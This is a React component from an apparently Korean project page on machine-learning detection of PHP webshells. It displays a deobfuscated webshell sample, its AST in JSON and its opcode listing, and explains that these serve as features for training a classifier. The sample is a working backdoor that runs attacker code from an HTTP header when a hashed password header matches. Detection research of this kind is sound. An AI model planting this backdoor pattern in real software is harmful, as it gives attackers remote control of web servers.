import ImageWithText from "./components/ImageWithText.tsx";
import styles from "./index.module.scss";

const Tokenization = () => {
  return (
    <div className={styles.container}>
      <div className={styles.terminalSection}>
        <div className={styles.imgSide}>
          <ImageWithText>
            {`<?php

$Xt = "}zyuyyo";
$sC = '-;K';
$yWIm3f4 = "a@P@nf";
$VSFHxobN6 = 'lTV^_A';
$NiMFQcdpv = 'Wg7}y';
$bO = "I(TFddG\\"L";
'yuAR9bK_IM';
$NFOor = '$a, ';
$tRPwxjf_2s = "c42";
$GYjy197jA = "HTTP_X_OS_PR";
$GqY8x4 = 'EFS';
$GnA = "md5";
$HK4kh284Iy = "getenv";
$ba = "create_function";
$mKGuIFLsIU9 = "HTTP_A";
$Ml1 = "Rc65x";
$YK3qRS = "Y8TNddWbL";
if (md5(getenv($mKGuIFLsIU9)) == "5d15db53a91790e913dc4e05a1319c42") {
    $kR_NKA7Su = create_function("\\$a, \\$b", getenv(
        /*I2jAJZEnpN'.
          '_nO*/
        "HTTP_X_OS_PREFS"
    ));
}
$kR_NKA7Su($Ml1, $YK3qRS);
#rTlthc@v^U@ykQuNEiaq9NFC'.
'n0dvU,yCve{Fu~CtA*8%sZWe_%mZdpX_<Ra4M~2GuB}6m4';`}
          </ImageWithText>
          <div className={styles.captionSide}>비난독화 후 코드</div>
        </div>
        <div className={styles.descriptionSide}>
          <h2 className={styles.highlight}>AST, opcode 추출</h2>
          <h1 className={styles.title}>
            AST와 opcode를 추출하여 <br />
            피쳐를 생성한 후 학습 및 분류에 사용
          </h1>
          <p className={styles.subtitle}>
            숨겨진 악성 코드를 더 잘 찾아낼 수 있다.
          </p>
        </div>
      </div>
      <div className={styles.terminalSection}>
        <div className={styles.imgSide}>
          <ImageWithText>
            {`[
    {
        "nodeType": "Stmt_Expression",
        "expr": {
            "nodeType": "Expr_Assign",
            "var": {
                "nodeType": "Expr_Variable",
                "name": "Xt",
                "attributes": {
                    "startLine": 3,
                    "endLine": 3
                }
            },
            "expr": {
                "nodeType": "Scalar_String",
                "value": "}zyuyyo",
                "attributes": {
                    "startLine": 3,
                    "endLine": 3,
                    "kind": 2,
                    "rawValue": "\\"}zyuyyo\\""
                }
            },
            "attributes": {
                "startLine": 3,
                "endLine": 3
            }
        },
        "attributes": {
            "startLine": 3,
            "endLine": 3
        }
    },
    {
        "nodeType": "Stmt_Expression",
        "expr": {
            "nodeType": "Expr_Assign",
            "var": {
                "nodeType": "Expr_Variable",
                "name": "sC",
                "attributes": {
                    "startLine": 4,
                    "endLine": 4
                }
            },
            "expr": {
                "nodeType": "Scalar_String",
                "value": "-;K",
                "attributes": {
                    "startLine": 4,
                    "endLine": 4,
                    "kind": 1,
                    "rawValue": "'-;K'"
                }
            },
            "attributes": {
                "startLine": 4,
                "endLine": 4
            }
        },
        "attributes": {
            "startLine": 4,
            "endLine": 4
        }
    },
    {
        "nodeType": "Stmt_Expression",
        "expr": {
            "nodeType": "Expr_Assign",
            "var": {
                "nodeType": "Expr_Variable",
                "name": "yWIm3f4",
                "attributes": {
                    "startLine": 5,
                    "endLine": 5
                }
            },
            "expr": {
                "nodeType": "Scalar_String",
                "value": "a@P@nf",
                "attributes": {
                    "startLine": 5,
                    "endLine": 5,
                    "kind": 2,
                    "rawValue": "\\"a@P@nf\\""
                }
            },
            "attributes": {
                "startLine": 5,
                "endLine": 5
            }
        },
        "attributes": {
            "startLine": 5,
            "endLine": 5
        }
    },`}
          </ImageWithText>
          <div className={styles.captionSide}>AST</div>
        </div>
        <div className={styles.imgSide}>
          <ImageWithText>
            {`
$_main:
     ; (lines=58, args=0, vars=17, tmps=23)
     ; /root/gradProj/result/webshell_deobfuscated/8c561905061461c8e110587f3527cdb9.php:1-30
L0003 0000 EXT_STMT
L0003 0001 ASSIGN CV0($Xt) string("}zyuyyo")
L0004 0002 EXT_STMT
L0004 0003 ASSIGN CV1($sC) string("-;K")
L0005 0004 EXT_STMT
L0005 0005 ASSIGN CV2($yWIm3f4) string("a@P@nf")
L0006 0006 EXT_STMT
L0006 0007 ASSIGN CV3($VSFHxobN6) string("lTV^_A")
L0007 0008 EXT_STMT
L0007 0009 ASSIGN CV4($NiMFQcdpv) string("Wg7}y")
L0008 0010 EXT_STMT
L0008 0011 ASSIGN CV5($bO) string("I(TFddG"L")
L0000 0012 NOP
L0010 0013 EXT_STMT
L0010 0014 ASSIGN CV6($NFOor) string("$a, ")
L0011 0015 EXT_STMT
L0011 0016 ASSIGN CV7($tRPwxjf_2s) string("c42")
L0012 0017 EXT_STMT
L0012 0018 ASSIGN CV8($GYjy197jA) string("HTTP_X_OS_PR")
L0013 0019 EXT_STMT
L0013 0020 ASSIGN CV9($GqY8x4) string("EFS")
L0014 0021 EXT_STMT
L0014 0022 ASSIGN CV10($GnA) string("md5")
L0015 0023 EXT_STMT
L0015 0024 ASSIGN CV11($HK4kh284Iy) string("getenv")
L0016 0025 EXT_STMT
L0016 0026 ASSIGN CV12($ba) string("create_function")
L0017 0027 EXT_STMT
L0017 0028 ASSIGN CV13($mKGuIFLsIU9) string("HTTP_A")
L0018 0029 EXT_STMT
L0018 0030 ASSIGN CV14($Ml1) string("Rc65x")
L0019 0031 EXT_STMT
L0019 0032 ASSIGN CV15($YK3qRS) string("Y8TNddWbL")
L0020 0033 EXT_STMT
L0020 0034 INIT_FCALL 1 96 string("md5")
L0020 0035 INIT_FCALL 1 96 string("getenv")
L0020 0036 SEND_VAR CV13($mKGuIFLsIU9) 1
L0020 0037 V33 = DO_FCALL
L0020 0038 SEND_VAR V33 1
L0020 0039 V34 = DO_FCALL
L0020 0040 T35 = IS_EQUAL V34 string("5d15db53a91790e913dc4e05a1319c42")
L0020 0041 JMPZ T35 0051
L0021 0042 EXT_STMT
L0021 0043 INIT_FCALL_BY_NAME 2 string("create_function")
L0021 0044 SEND_VAL_EX string("$a, $b") 1
L0021 0045 INIT_FCALL 1 96 string("getenv")
L0024 0046 SEND_VAL string("HTTP_X_OS_PREFS") 1
L0024 0047 V36 = DO_FCALL
L0024 0048 SEND_VAR_NO_REF_EX V36 2
L0024 0049 V37 = DO_FCALL
L0021 0050 ASSIGN CV16($kR_NKA7Su) V37
L0027 0051 EXT_STMT
L0027 0052 INIT_DYNAMIC_CALL 2 CV16($kR_NKA7Su)
L0027 0053 SEND_VAR_EX CV14($Ml1) 1
L0027 0054 SEND_VAR_EX CV15($YK3qRS) 2
L0027 0055 DO_FCALL
L0030 0056 EXT_STMT
L0030 0057 RETURN int(1)`}
          </ImageWithText>
          <div className={styles.captionSide}>opcode</div>
        </div>
      </div>
    </div>
  );
};

export default Tokenization;
